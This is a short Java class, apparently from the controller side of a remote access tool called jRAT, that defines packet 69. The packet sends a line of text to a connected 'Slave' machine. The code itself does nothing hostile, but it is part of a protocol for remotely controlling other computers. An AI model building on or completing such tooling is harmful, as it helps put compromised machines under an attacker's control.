package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet69Print extends AbstractOutgoingPacket {

	private String text;

	public Packet69Print(String text) {
		this.text = text;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(text);
	}

	@Override
	public byte getPacketId() {
		return 69;
	}

}
